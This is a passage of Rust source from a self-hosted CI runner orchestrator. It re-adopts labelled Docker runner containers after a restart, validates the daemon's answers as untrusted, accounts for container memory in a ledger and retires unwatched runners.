    u64::try_from(bytes)
        .ok()
        .map(|b| b.min(untrusted::MAX_MEM_BYTES) / (1024 * 1024))
}

/// A container's `--cpus` quota (`HostConfig.NanoCpus`, 1e9 per core) as cores.
/// `0` is "no quota", and so is a figure no container could have, which is what
/// an absent quota already reads as: the quota is a ceiling read back for
/// censoring, never a charge.
fn quota_cpus(nano: i64) -> f64 {
    u64::try_from(nano)
        .ok()
        .filter(|n| *n <= untrusted::MAX_CPUS * 1_000_000_000)
        .map_or(0.0, |n| n as f64 / 1e9)
}

/// A runner container this process did not start, rebuilt from its own labels.
///
/// Everything here came off the container. Nothing was remembered, and nothing
/// was asked of GitHub — that is the property that makes adoption work after a
/// SIGKILL, a panic or a power cut, not merely after a planned restart.
#[derive(Debug, Clone, PartialEq)]
pub struct Adopted {
    pub job_id: u64,
    pub repo: String,
    pub run_id: u64,
    pub attempt: u32,
    pub profile: String,
    pub class: String,
    /// What the limiter charged for this claim, to re-debit the rebuilt ledger.
    pub reserved_mib: u64,
    /// The CPU the limiter charged (millicores), or `None` for a container minted
    /// before ADR-0019 stamped it — which is charged its class's current share.
    pub reserved_mcpu: Option<u64>,
    /// The ceilings the container is *actually* running under, read back off it —
    /// the runner's `--cpus` quota included. Not the same numbers as the
    /// reservation, and needed for OOM censoring.
    pub limits: Limits,
    /// The tag the container runs on — republished into the ADR-0009 pool so a
    /// restart does not weigh the next mint against an empty pool.
    pub image: String,
    /// What that tag serves. Empty is "unknown", exactly as `PoolImage` means it.
    pub serves: Vec<String>,
    /// The services the runner has ([`LABEL_SERVICES`]), to detach at teardown and
    /// name in the outcome (ADR-0046). Empty when it had none, and for a container
    /// started before the label existed.
    pub services: Vec<String>,
    /// Unix ms the container started, from Docker. The claim's elapsed readout and
    /// the *remaining* lifetime cap are both measured from here, never from the
    /// moment of adoption.
    pub started_ms: u64,
    /// False for a container that finished while nothing was watching. Adopted all
    /// the same: its corpse still carries the exit code and the OOM verdict, which
    /// is strictly more than the sweep would have recovered.
    pub running: bool,
    /// What its job-started hook does at the deadline ([`LABEL_HOOK`]), or
    /// `None` for a container started before the hook existed, which has none
    /// (ADR-0059 §2: runners adopted after a restart get their verdicts).
    pub hook: Option<crate::job_start::DeadlineOutcome>,
    names: Names,
}

impl Adopted {
    /// The runner container's name — the handle for logs and for `docker wait`.
    pub fn runner(&self) -> &str {
        &self.names.runner
    }

    /// The name the runner registered under on GitHub (`faber-{job_id}-{ts}`) —
    /// the identity the reconciler judges its claim by, and a reclaim withdraws.
    pub fn registration(&self) -> String {
        format!("faber-{}", self.names.id)
    }

    /// The claim id (`org.faber.id`): what its services' role is named from
    /// (ADR-0046 §10).
    pub fn claim_id(&self) -> &str {
        &self.names.id
    }
}

/// A faber-owned runner container that is running but cannot be rebuilt into a
/// claim — no labels (minted before ADR-0011), or labels this binary cannot make
/// sense of.
///
/// It is still **faber's**, and it is still holding memory. The ledger has to
/// know about it for the same reason it has to know about an adopted claim: the
/// memory is spent whatever faber remembers, and a budget that ignores it will
/// admit new work on top of it. Charging the applied ceiling is deliberately
/// pessimistic — it is the only number the container itself can answer with, and
/// over-reserving costs throughput where under-reserving costs the host.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Opaque {
    pub name: String,
    /// Its paired dind, whose ceiling counts toward what it is holding — `None`
    /// when the runner's name gives no id a dind could be named by (#105).
    dind: Option<String>,
    /// Why it could not be adopted, for the log line.
    pub reason: String,
    /// Applied runner + dind ceilings (MiB) — what to charge the ledger.
    pub mem_mib: u64,
    /// Unix ms it started, from Docker, when that reads: what a switched-off
    /// Linux VM caps its wait for it from (ADR-0051, [`retire_opaque`]).
    pub started_ms: Option<u64>,
}

/// What one pass over this host's runner containers found.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Scan {
    /// Rebuildable claims.
    pub adoptable: Vec<Adopted>,
    /// Running, faber's, and not rebuildable — accounted for, not adopted.
    pub opaque: Vec<Opaque>,
}

/// Every faber-owned runner container on this host, split into what can be
/// rebuilt as a claim and what can only be accounted for.
///
/// `None` means Docker could not be read at all, which is emphatically *not*
/// "nothing is running" — a caller that confused the two would admit new jobs
/// against a ledger reading zero while real containers hold real memory. Every
/// caller must treat `None` as "cannot tell" (ADR-0011 §5). So is an answer
/// faber cannot read whole (#105): a container left out of it would be charged
/// nothing.
pub async fn scan() -> Option<Scan> {
    let names = docker_lines(
        &[
            "ps",
            "-a",
            "--filter",
            "label=org.faber.owned=true",
            "--filter",
            "label=org.faber.kind=runner",
            "--format",
            "{{.Names}}",
        ],
        CLI_TIMEOUT,
    )
    .await
    .map_err(|e| warn!("adopt: listing runner containers: {e}"))
    .ok()?;
    // #105: a name goes back on the next command line, so only one in Docker's
    // own alphabet does. And one that is not makes the listing unreadable whole,
    // since a container left out of it would be charged nothing: this is the
    // ledger's listing, and a skipped row would admit more.
    let names = untrusted::accept_all(names, "adopt: runner container listing", |name| {
        if untrusted::object_name(&name) {
            Ok(Some(name))
        } else {
            Err("a container name is outside Docker's own alphabet")
        }
    })?;
    if names.is_empty() {
        return Some(Scan::default());
    }

    let found = inspect_many(&names).await?;
    let mut out = Vec::new();
    let mut opaque = Vec::new();
    for c in &found {
        match adopted_from(c) {
            Some(a) => out.push(a),
            // Only a *running* one costs anything. An exited container that
            // cannot be adopted holds no memory and is purely the janitor's.
            None => {
                if let Some(o) = opaque_from(c) {
                    opaque.push(o);
                } else {
                    debug!(
                        "adopt: ignoring a container that is not ours to hold: {}",
                        untrusted::for_log(c.bare_name(), 120)
                    );
                }
            }
        }
    }
    // dind's ceiling lives on dind, and it is what an OOM sample must be censored
    // at. A dind that is gone leaves the cap at 0, which `sample_for` reads as "no
    // cap to censor at" rather than inventing one. An answer that cannot be read
    // leaves the whole scan unread: an opaque runner's dind is part of its charge.
    let dinds: Vec<String> = out
        .iter()
        .map(|a| a.names.dind.clone())
        .chain(opaque.iter().filter_map(|o| o.dind.clone()))
        .collect();
    for c in &inspect_many(&dinds).await? {
        let name = c.bare_name();
        let mib = memory_mib(c.memory);
        if let Some(a) = out.iter_mut().find(|a| a.names.dind == name) {
            // Read for censoring only: a ceiling that does not read is no cap.
            a.limits.dind.memory_mib = mib.unwrap_or(0);
        }
        // An opaque runner's dind counts toward what it is holding, exactly as an
        // adopted one's does — and one that does not read charges the most.
        if let Some(o) = opaque.iter_mut().find(|o| o.dind.as_deref() == Some(name)) {
            o.mem_mib = o
                .mem_mib
                .saturating_add(mib.unwrap_or(untrusted::MAX_MEM_MIB));
        }
    }
    Some(Scan {
        adoptable: out,
        opaque,
    })
}

/// A runner container that [`adopted_from`] refused but that is still faber's and
/// still running — the ledger's problem even though the claim map's it is not.
fn opaque_from(c: &Inspected) -> Option<Opaque> {
    if !c.running {
        return None;
    }
    let name = c.bare_name();
    // Prefix, never a substring: an unrelated compose project's
    // `myproj-faber-runner-1` is not faber's to charge for.
    let id = name.strip_prefix("faber-runner-")?;
    // #105: the id goes into the name of the dind faber inspects next, so only one
    // in a name's alphabet names a dind. The runner is charged regardless: it holds
    // its memory whether or not its claim reads, and a refusal here must never
    // admit more.
    let dind = untrusted::object_name(id).then(|| format!("faber-dind-{id}"));
    let missing: Vec<&str> = ADOPT_LABELS
        .iter()
        .filter(|(_, key)| c.label(key).is_none())
        .map(|(short, _)| *short)
        .collect();
    Some(Opaque {
        name: name.to_string(),
        dind,
        reason: if missing.is_empty() {
            "labels present but unreadable".to_string()
        } else {
            format!("no ADR-0011 label(s): {}", missing.join(", "))
        },
        // A ceiling that does not read charges the most there is, not nothing.
        mem_mib: memory_mib(c.memory).unwrap_or(untrusted::MAX_MEM_MIB),
        started_ms: epoch_ms_from_rfc3339(&c.started_at),
    })
}

/// Block until `name` is gone, so a caller can hold a ledger charge for exactly
/// as long as the container holds the memory. No teardown: an opaque container
/// is not this process's to reap on a claim's behalf, and the janitor already
/// reaps by ownership.
pub async fn wait_until_gone(name: &str) {
    if let Err(e) = wait_for_exit(name.to_string()).await {
        debug!("adopt: waiting on {name}: {e} — releasing its ledger charge");
    }
}

/// `docker inspect` over a batch, degrading to one call per name.
///
/// The batch exits non-zero if *any* name has vanished since it was listed —
/// which is an ordinary race, not a failure — so the fallback asks one at a time
/// and simply drops whatever is gone.
///
/// `None` when an answer cannot be read whole ([`inspected_answer`]): this feeds
/// a ledger that must charge every running container, so a container faber cannot
/// read is "cannot tell", never one container fewer (#105).
async fn inspect_many(names: &[String]) -> Option<Vec<Inspected>> {
    if names.is_empty() {
        return Some(Vec::new());
    }
    let mut args = vec![
        "container".to_string(),
        "inspect".to_string(),
        "--format".to_string(),
        ADOPT_FORMAT.to_string(),
    ];
    args.extend(names.iter().cloned());
    if let Ok(text) = docker_stdout(&args, CLI_TIMEOUT, untrusted::OUTPUT_CAP).await {
        return inspected_answer(&text, names);
    }
    let mut out: Vec<Inspected> = Vec::new();
    for n in names {
        if let Ok(text) = docker_stdout(
            &["container", "inspect", "--format", ADOPT_FORMAT, n.as_str()],
            CLI_TIMEOUT,
            untrusted::OUTPUT_CAP,
        )
        .await
        {
            out.extend(inspected_answer(&text, std::slice::from_ref(n))?);
        }
    }
    Some(out)
}

/// What one `docker inspect` printed for `asked`, all or nothing (#105).
///
/// `None` when a line does not parse, or answers for a container that was not
/// asked about. Every name downstream of here goes back on a command line and into
/// the log, and was checked once, in the listing it was asked from. An answer
/// naming anything else is not the answer to the question.
fn inspected_answer(text: &str, asked: &[String]) -> Option<Vec<Inspected>> {
    let found = untrusted::json_lines_all::<Inspected>(text, "adopt: container inspect")?;
    if let Some(c) = found
        .iter()
        .find(|c| !asked.iter().any(|n| n == c.bare_name()))
    {
        warn!(
            "adopt: container inspect answered for {}, which was not asked about — reading \
             the whole answer as unreadable",
            untrusted::for_log(c.bare_name(), 120)
        );
        return None;
    }
    Some(found)
}

/// One [`ADOPT_FORMAT`] line into an [`Adopted`], or `None` if it is not one.
#[cfg(test)]
pub(crate) fn parse_adopted(line: &str) -> Option<Adopted> {
    adopted_from(&serde_json::from_str(line).ok()?)
}

/// One [`ADOPT_FORMAT`] line into an [`Opaque`], or `None` if it is not one.
#[cfg(test)]
fn parse_opaque(line: &str) -> Option<Opaque> {
    opaque_from(&serde_json::from_str(line).ok()?)
}

/// One inspected container as an [`Adopted`], or `None` if it is not one.
///
/// Every ADR-0011 field is required. A container missing any of them was started
/// by a faber that predates ADR-0011, and adopting it on defaults would charge the
/// ledger a number nobody measured — worse than not adopting it at all, which
/// merely costs one drain. The ADR-0019 fields after them are not: memory is what
/// must never be guessed, and a pre-ADR-0019 container is charged its class's CPU
/// share instead.
///
/// And every one is held to the form faber writes it in (#105). The daemon that
/// reports these labels may be lying, and they become a claim: a repo the
/// reconciler will query, a name the janitor shields, numbers the ledger charges.
/// A container whose labels do not read as faber's is not adopted. If it is
/// running it is still charged, as [`Opaque`], so a refusal here never admits more.
fn adopted_from(c: &Inspected) -> Option<Adopted> {
    let name = c.bare_name();
    let id = name.strip_prefix("faber-runner-")?;
    let (job_id, _) = untrusted::claim_id(id)?;
    let repo = c.label(LABEL_REPO).filter(|r| untrusted::repo_slug(r))?;
    let class = c
        .label(LABEL_CLASS)
        .filter(|k| untrusted::label_text(k, MAX_CLASS_LABEL))
        // A class key is `{repo}::{workflow_id}::{job}`, of this claim's own repo.
        .filter(|k| {
            k.strip_prefix(repo)
                .and_then(|rest| rest.strip_prefix("::"))
                .is_some_and(|rest| !rest.is_empty())
        })?;
    // `serves` may be empty: an unknown image serves nothing and says so with an
    // empty value, which is distinct from the absent label a pre-ADR-0011
    // container has.
    let serves: Vec<String> = c
        .label(LABEL_SERVES)?
        .split(',')
        .filter(|v| !v.is_empty())
        .map(str::to_string)
        .collect();
    if !serves.iter().all(|v| untrusted::version(v)) {
        return None;
    }
    let image = Some(c.image.as_str()).filter(|i| untrusted::image_ref(i))?;
    Some(Adopted {
        job_id,
        repo: repo.to_string(),
        run_id: c.label(LABEL_RUN_ID).and_then(untrusted::number)?,
        attempt: c
            .label(LABEL_ATTEMPT)
            .and_then(untrusted::number)
            .and_then(|n| u32::try_from(n).ok())?,
        profile: c
            .label(LABEL_PROFILE)
            .filter(|p| !p.is_empty() && untrusted::label_text(p, MAX_PROFILE_LABEL))?
            .to_string(),
        class: class.to_string(),
        // A charge past any VM is held to the most there is, never refused: what
        // the ledger is charged must not shrink because the figure was absurd.
        reserved_mib: c
            .label(LABEL_RESERVED)
            .and_then(untrusted::number)
            .map(|mib| mib.min(untrusted::MAX_MEM_MIB))?,
        // Absent on an older container, and anything unreadable reads the same
        // way: the fallback is only a CPU estimate, never a memory one. A figure
        // past any VM is held to the most there is, not dropped to that estimate.
        reserved_mcpu: c
            .label(LABEL_RESERVED_MCPU)
            .and_then(untrusted::number)
            .map(|mcpu| mcpu.min(untrusted::MAX_CPUS * 1000)),
        limits: Limits {
            runner: ResourceLimits {
                // `NanoCpus` counts 1e9 per core, and `0` is "no quota" — which is
                // exactly what `cpus: 0.0` means.
                cpus: quota_cpus(c.nano_cpus),
                memory_mib: memory_mib(c.memory)?,
            },
            dind: ResourceLimits::default(),
        },
        image: image.to_string(),
        serves,
        services: services_from_label(c.label(LABEL_SERVICES)),
        started_ms: epoch_ms_from_rfc3339(&c.started_at)?,
        running: c.running,
        hook: c
            .label(LABEL_HOOK)
            .and_then(crate::job_start::DeadlineOutcome::parse),
        names: Names::for_runner(&format!("faber-{id}")),
    })
}

/// The service names an adopted runner's [`LABEL_SERVICES`] carries, held to the
/// form faber writes them in (#105): `postgres-<major>`, or a bare service name
/// (a DNS label, ADR-0046 A1). Any name in that form is accepted, not only the
/// ones the current config declares: a restart must not orphan a service because
/// its table was edited in between (A4). The label is optional, so an unreadable one is not a
/// reason to refuse the claim: it reads as no services, and teardown leaves
/// whatever they were to `sweep`, which reaps per-job service containers by
/// `org.faber.id`.
fn services_from_label(label: Option<&str>) -> Vec<String> {
    let Some(label) = label.filter(|l| !l.is_empty()) else {
        return Vec::new();
    };
    let names: Vec<String> = label.split(',').map(str::to_string).collect();
    let valid = |n: &String| crate::services::service_name_in_faber_form(n);
    if names.len() <= MAX_SERVICES_LABEL && names.iter().all(valid) {
        names
    } else {
        warn!(
            "adopt: a runner's {LABEL_SERVICES} label is not in faber's form ({}) — adopting \
             it without services; sweep reaps what they left",
            untrusted::for_log(label, 120)
        );
        Vec::new()
    }
}

/// The most services one [`LABEL_SERVICES`] may name: the shared Postgres and a
/// generous number of per-job ones. A bound on what a label can make faber do,
/// not on config.
const MAX_SERVICES_LABEL: usize = 16;

/// Watch an adopted container to completion, then tear its sandbox down.
///
/// The mirror of [`run_one`] with the whole provisioning ramp removed: the
/// network, the volume, dind, the JIT registration and the container all already
/// exist. `lifetime` is what remains of the cap measured from the container's own
/// start, so a restart never grants an in-flight job a fresh one.
///
/// `gh` is needed only by a reclaim, which withdraws the runner's registration
/// before it may kill it. The registration's id died with the process that minted
/// it, so it is found by name — the name in `minted`, the audit log's record of
/// the mint, never the one the container reports (#105). With no record, `minted`
/// is `None`, and a reclaim of this container is always refused.
pub async fn adopt_one(
    gh: &Github,
    a: &Adopted,
    minted: Option<MintedRunner>,
    lifetime: Duration,
    cancel: watch::Receiver<bool>,
) -> anyhow::Result<RunReport> {
    let registration = Registration { gh, minted };
    // Whether this claim has a daemon is asked of Docker rather than remembered,
    // for the same reason everything else about an adopted claim is (ADR-0011):
    // the container is the only thing that survived. A dind is not `--rm`, so even
    // one that died mid-run is still there to be found; only a run that never had
    // one reads as absent. `None` — Docker would not answer — falls back to
    // "there is one", which costs at worst the pre-existing unreadable-counter
    // warning rather than skipping a real container's teardown.
    let dind = !matches!(container_absent(&a.names.dind).await, Some(true));
    let result = watch_to_completion(
        &a.names,
        &registration,
        dind,
        &a.limits,
        Some(a.image.clone()),
        lifetime,
        cancel,
    )
    .await;
    let mirror_incident = teardown(&a.names, dind, &a.services, &a.repo).await;
    result.map(|mut report| {
        report.services = a.services.clone();
        note_mirror_incident(&mut report, &a.names.runner, mirror_incident);
        report
    })
}

// ---------------------------------------------------------------------------
// ADR-0051: runners left in a switched-off Linux VM
// ---------------------------------------------------------------------------

/// When a runner container's lifetime cap runs out, Unix ms: `runner_timeout`
/// after its own start, as [`adopt_one`]'s remaining lifetime is measured.
/// `None` when the cap is off (`runner_timeout_secs = 0`).
pub fn cap_deadline_ms(started_ms: u64, runner_timeout: Duration) -> Option<u64> {
    (!runner_timeout.is_zero())
        .then(|| started_ms.saturating_add(runner_timeout.as_millis() as u64))
}

/// One pass over a runner that `[linux_vm] enabled = false` left unwatched: its
/// docker profiles are gone from this boot, so no claim was adopted for it and
/// neither the lifetime cap nor a reclaim reaches it otherwise (ADR-0051).
/// `true` once it is torn down, `false` while it must keep running.
///
/// The same two endings a watched runner has, in the same order:
/// - **The cap**, once `cap_passed`: removed as a cap-expired runner is, job or
///   no job ([`teardown`]).
/// - **A reclaim**: an idle runner is withdrawn from GitHub and removed, by the
///   very check a reclaim makes ([`reclaim_clearance`], ADR-0017), so it takes no
///   new job on a host whose docker profiles are off. A busy one, or one faber's
///   records do not vouch for (#105), is refused and left to finish or to the
///   cap. One that has exited is torn down.
pub(crate) async fn retire_unwatched(
    gh: &Github,
    a: &Adopted,
    minted: Option<MintedRunner>,
    cap_passed: bool,
) -> bool {
    let names = &a.names;
    let registration = Registration { gh, minted };
    retire_with(
        cap_passed,
        || clear_for_reclaim(names, &registration),
        || async {
            let dind = !matches!(container_absent(&names.dind).await, Some(true));
            let _ = teardown(names, dind, &a.services, &a.repo).await;
        },
    )
    .await
}

/// [`retire_unwatched`]'s decision, past its reads of Docker and GitHub: a seam,
/// so a test drives an idle, a busy and a capped runner without either.
pub(crate) async fn retire_with<C, CF, T, TF>(cap_passed: bool, clear: C, teardown: T) -> bool
where
    C: FnOnce() -> CF,
    CF: std::future::Future<Output = Clearance>,
    T: FnOnce() -> TF,
    TF: std::future::Future<Output = ()>,
{
    if !cap_passed {
        match clear().await {
            Clearance::Idle | Clearance::Stopped => {}
            Clearance::Refused(_) => return false,
        }
    }
    teardown().await;
    true
}

/// [`retire_unwatched`] for an [`Opaque`] runner. Without its claim labels it has
/// no registration faber may touch (#105), so only the cap ends it, measured from
/// its own start; one whose start does not read is never capped.
pub(crate) async fn retire_opaque(o: &Opaque, cap_passed: bool) -> bool {
    if !cap_passed {
        return false;
    }
    for name in std::iter::once(&o.name).chain(o.dind.as_ref()) {
        if let Err(e) = remove_container(name).await {
            warn!("teardown: removing container {name}: {e}");
        }
    }
    true
}

/// Log the last few lines of a container's own output, for a run that ended
/// badly. Best-effort and silent on failure: this is a diagnostic, never a step
/// the outcome depends on.
async fn log_tail(name: &str) {
    match docker_lines(&["logs", "--tail", "20", name], CLI_TIMEOUT).await {
        // The job's own output: each line's control characters escaped and its
        // length cut before it reaches faber's log.
        Ok(lines) if !lines.is_empty() => warn!(
            "docker runner {name} last output:\n{}",
            lines
                .iter()
                .map(|l| untrusted::for_log(l, LOG_TAIL_LINE))
                .collect::<Vec<_>>()
                .join("\n")
        ),
        Ok(_) => {}
        Err(e) => debug!("docker runner {name}: could not read its log ({e})"),
    }
}

/// How much of one line of a runner's own output [`log_tail`] logs.
const LOG_TAIL_LINE: usize = 500;

/// `docker wait <name>`, shaped like a process exit.
///
/// The only way faber ever learns a runner's exit code. Reconstructing an
/// `ExitStatus` from the code docker prints keeps the outcome mapping written
/// against one familiar type; it is not standing in for anything, since nothing
/// attaches to a runner any more. Deliberately unbounded — the lifetime cap is
/// the `select!`'s job.
async fn wait_for_exit(name: String) -> std::io::Result<std::process::ExitStatus> {
    use std::os::unix::process::ExitStatusExt;
    let mut cmd = docker_command();
    cmd.args(["wait", &name]);
    // Unbounded in time, deliberately, but never in size (#105).
    let out = untrusted::output_capped(cmd, untrusted::OUTPUT_CAP, &format!("docker wait {name}"))
        .await
        .map_err(std::io::Error::other)?;
    if !out.status.success() {
        return Err(std::io::Error::other(format!(
            "docker wait {name} exited {}: {}",
            out.status,
            stderr_of(&out)
        )));
    }
    let code = exit_code(&String::from_utf8_lossy(&out.stdout))
        .ok_or_else(|| std::io::Error::other(format!("docker wait {name} printed no exit code")))?;
    // `<< 8` is the wait(2) encoding `ExitStatus` wraps: the low byte is the
    // signal, the high byte the exit code.
    Ok(std::process::ExitStatus::from_raw(code << 8))
}

/// The exit code `docker wait` printed, or `None` for anything that is not one: an
/// exit code is a byte, and `<< 8` on anything wider would not be one either (#105).
fn exit_code(text: &str) -> Option<i32> {
    untrusted::number(text.trim())
        .filter(|code| *code <= 255)
        .and_then(|code| i32::try_from(code).ok())
}

/// Running faber runner containers that carry no ADR-0011 claim labels.
///
/// The preflight's third condition. Non-empty means a restart would leave these
/// un-adoptable, so the caller must drain instead. `None` = Docker unreadable, or
/// a row of its answer unreadable ([`unlabelled_from`]), which is also not
/// adoptable, but for a different reason the caller logs.
pub async fn unlabelled_runners() -> Option<Vec<String>> {
    let text = docker_stdout(
        &unlabelled_runner_ps_args(),
        CLI_TIMEOUT,
        untrusted::OUTPUT_CAP,
    )
    .await
    .ok()?;
    unlabelled_from(&text)
}

/// The `docker ps` argv behind [`unlabelled_runners`]: live runner containers —
/// a frozen one included ([`LIVE_STATUSES`]), which a restart must account for
/// like any other — with the claim label that says whether one can be adopted.
fn unlabelled_runner_ps_args() -> Vec<String> {
    let mut args = vec![
        "ps".to_string(),
        "--filter".to_string(),
        "name=faber-runner-".to_string(),
    ];
    args.extend(live_status_filters());
    args.extend(["--format".to_string(), UNLABELLED_FORMAT.to_string()]);
    args
}

/// A runner's name and its `org.faber.reserved-mib` label, one JSON object per
/// line. Tab-separated, an empty label used to be trimmed off with the line's
/// whitespace, so the row never split and no unlabelled runner was ever reported.
const UNLABELLED_FORMAT: &str =
    r#"{"Name":{{json .Names}},"Reserved":{{json (.Label "org.faber.reserved-mib")}}}"#;

/// One row of [`UNLABELLED_FORMAT`].
#[derive(Debug, Deserialize)]
struct NamedReservation {
    #[serde(rename = "Name")]
    name: String,
    #[serde(rename = "Reserved", default)]
    reserved: String,
}

/// The names in an [`UNLABELLED_FORMAT`] listing whose claim label is missing.
///
/// `None` when any row of faber's own cannot be read (#105). The preflight then
/// drains, as it does when Docker does not answer: a restart that skipped a row
/// would leave a runner it never judged to the next process.
fn unlabelled_from(text: &str) -> Option<Vec<String>> {
    let rows = untrusted::json_lines_all::<NamedReservation>(text, "preflight: runner listing")?;
    untrusted::accept_all(rows, "preflight: runner listing", |row| {
        // Name-prefix only, never a substring: an unrelated compose project
        // producing `myproj-faber-runner-1` is not faber's to judge. Same
        // shielding `crate::sweep` carries, for the same reason.
        if !row.name.starts_with("faber-runner-") {
            Ok(None)
        } else if !untrusted::object_name(&row.name) {
            Err("a container name is outside Docker's own alphabet")
        } else {
            Ok(row.reserved.is_empty().then_some(row.name))
        }
    })
}

// ---------------------------------------------------------------------------
// ADR-0032 §2: the critical floor freezes a job, and a frozen job is still alive
// ---------------------------------------------------------------------------

/// The container states in which a job is alive: running, or paused by the
/// critical floor (ADR-0032 §2).
///
/// Docker keeps a paused container's `State.Running` true, but its status is
/// `paused`, and a `status=running` filter leaves it out. A listing that means
/// "this job's container is still there" must therefore ask for both, or a frozen
/// job reads as one that died: reclaimed as dead supply, drained past, reaped.
/// Repeated `status=` filters are OR'd by the daemon.
pub(crate) const LIVE_STATUSES: [&str; 2] = ["running", "paused"];

/// The `--filter status=…` pairs for [`LIVE_STATUSES`], for a `docker ps` argv.
pub(crate) fn live_status_filters() -> Vec<String> {
    LIVE_STATUSES
        .iter()
        .flat_map(|s| ["--filter".to_string(), format!("status={s}")])
        .collect()
}

/// How long one `docker pause` or `docker unpause` may take. Freezing a cgroup
/// waits for every task in it to stop, and a task in the middle of a disk write on
/// a nearly full volume is exactly what this is for, so it gets more than a
/// metadata call. Bounded all the same, like every call here: what the daemon
/// finishes after the client gives up is read back from the next listing rather
/// than assumed.
const FREEZE_TIMEOUT: Duration = Duration::from_secs(60);

/// One of a job's live containers, as the critical floor reads it (ADR-0032 §2):
/// the container id Docker reports, the claim and the kind its labels give it,
/// and whether it is paused. Found by faber's labels alone, never by name
/// (AGENTS.md).
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct JobContainer {
    /// What `docker pause` and `docker unpause` are given: the full 64-hex id.
    pub id: String,
    /// `org.faber.id`: `{job_id}-{ts}`, the claim it belongs to ([`claim_id`]).
    pub claim: String,
    /// `org.faber.kind`: [`KIND_RUNNER`] or [`KIND_DIND`].
    pub kind: String,
    pub paused: bool,
}

/// The `docker ps` argv listing faber's live per-job containers, with the fields
/// [`JobContainer`] reads: owned by faber (the label, not the name), running or
/// frozen. `--no-trunc`, so an id is the whole id, which is the only form one can
/// be checked against.
fn job_container_ps_args() -> Vec<String> {
    let mut args = vec![
        "ps".to_string(),
        "--no-trunc".to_string(),
        "--filter".to_string(),
        format!("label={LABEL_OWNED}=true"),
    ];
    args.extend(live_status_filters());
    args.extend(["--format".to_string(), JOB_CONTAINER_FORMAT.to_string()]);
    args
}

/// A job container's id, kind, claim and state, one JSON object per line.
const JOB_CONTAINER_FORMAT: &str = r#"{"ID":{{json .ID}},"Kind":{{json (.Label "org.faber.kind")}},"Claim":{{json (.Label "org.faber.id")}},"State":{{json .State}}}"#;

/// One row of [`JOB_CONTAINER_FORMAT`].
#[derive(Debug, Deserialize)]
struct ListedJobContainer {
    #[serde(rename = "ID")]
    id: String,
    #[serde(rename = "Kind", default)]
    kind: String,
    #[serde(rename = "Claim", default)]
    claim: String,
    #[serde(rename = "State", default)]
    state: String,
}

/// The [`JobContainer`]s in a [`JOB_CONTAINER_FORMAT`] listing.
///
/// Anything faber owns that is not a job's runner or dind — a cache helper, say —
/// is not the floor's and is left out without a word, and so is one carrying no
/// claim to join it to.
///
/// A runner or dind whose id is not a full Docker id, or whose claim is not
/// faber's `{job_id}-{ts}`, makes the whole listing `None` (#105). The id goes on
/// `docker pause`'s command line and the claim decides which job is frozen, so
/// neither is taken in any other form. And the floor decides nothing that tick
/// rather than act on a job read one container short, which it would freeze or
/// thaw by half.
fn job_containers_from(text: &str) -> Option<Vec<JobContainer>> {
    let rows =
        untrusted::json_lines_all::<ListedJobContainer>(text, "critical floor: job listing")?;
    untrusted::accept_all(rows, "critical floor: job listing", |row| {
        if ![KIND_RUNNER, KIND_DIND].contains(&row.kind.as_str()) || row.claim.is_empty() {
            return Ok(None);
        }
        if !untrusted::object_id(&row.id) {
            return Err("a container id is not 64 hex digits");
        }
        if untrusted::claim_id(&row.claim).is_none() {
            return Err("a claim label is not a job id and a timestamp");
        }
        Ok(Some(JobContainer {
            paused: row.state == "paused",
            id: row.id,
            claim: row.claim,
            kind: row.kind,
        }))
    })
}

/// Every live runner and dind container faber owns on this host, running or
/// frozen. An error is Docker not answering, or an answer that cannot be read
/// whole, which the caller must read as "cannot tell", never as "no jobs".
pub(crate) async fn live_job_containers() -> anyhow::Result<Vec<JobContainer>> {
    let text = docker_stdout(&job_container_ps_args(), CLI_TIMEOUT, untrusted::OUTPUT_CAP).await?;
    job_containers_from(&text)
        .ok_or_else(|| anyhow::anyhow!("a row of the job listing is not in faber's form"))
}

// ---------------------------------------------------------------------------
// ADR-0021 §3: what the VM uses beyond faber's own containers
// ---------------------------------------------------------------------------

/// One sample for the co-tenant reserve: the VM's `MemAvailable` and the working
/// set of faber's own containers, read together (MiB).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct FaberUse {
    pub available_mib: u64,
    pub faber_mib: u64,
}

/// Read what faber's own containers hold and what the VM has left, bracketed so
/// that one sample cannot charge faber's memory to the co-tenants.
///
/// faber's containers are listed by the `org.faber.owned` label, before and
/// after; their memory is read with `docker stats` before and after
/// `MemAvailable`, and each counts at the larger of its two readings. The sample
/// is refused when the listing changed between the two, when one of faber's
/// containers has no reading in either, or when one of faber's own variant
/// builds ran at any point during it: a build's memory is in no container faber
/// can list.
///
/// That bracketing matters because the result feeds a 24-hour peak, so a figure
/// that is too high once is held back from CI for a day. A job that exits between
/// the two reads, or frees gigabytes between them, would otherwise leave its
/// memory in "used" and out of "faber's". Every refusal and every max errs the
/// other way: towards a co-tenant figure that is too low for one sample, which the
/// peak over many samples absorbs, and which `reserve_mib` floors anyway.
pub async fn sample_faber_use(probe_image: &str) -> anyhow::Result<FaberUse> {
    let builds = build_mark();
    anyhow::ensure!(builds.is_some(), "faber is building a runner image");
    let before = faber_container_ids().await?;
    let first = container_mem_mib().await?;
    let available_mib = probe_mem_available_mib(probe_image).await?;
    let second = container_mem_mib().await?;
    let after = faber_container_ids().await?;
    anyhow::ensure!(
        before == after,
        "faber's containers changed during the sample"
    );
    anyhow::ensure!(
        build_mark() == builds,
        "faber built a runner image during the sample"
    );
    let faber_mib = faber_working_set(&before, &first, &second)
        .ok_or_else(|| anyhow::anyhow!("one of faber's containers has no memory reading"))?;
    Ok(FaberUse {
        available_mib,
        faber_mib,
    })
}

/// The working set of the containers in `ids` (MiB): each at the larger of its
/// two readings. `None` when one has a reading in neither, since leaving it out
/// would charge its memory to the co-tenants.
fn faber_working_set(
    ids: &BTreeSet<String>,
    first: &HashMap<String, u64>,
    second: &HashMap<String, u64>,
) -> Option<u64> {
    ids.iter().try_fold(0u64, |sum, id| {
        let mib = match (first.get(id), second.get(id)) {
            (Some(a), Some(b)) => *a.max(b),
            (Some(a), None) | (None, Some(a)) => *a,
            (None, None) => return None,
        };
        Some(sum.saturating_add(mib))
    })
}

/// The `docker ps` argv listing the ids of every live container faber owns, by
/// label alone (AGENTS.md): runners, dinds, and anything else faber started.
fn faber_container_ps_args() -> Vec<String> {
    let mut args = vec![
        "ps".to_string(),
        "--no-trunc".to_string(),
        "--filter".to_string(),
        format!("label={LABEL_OWNED}=true"),
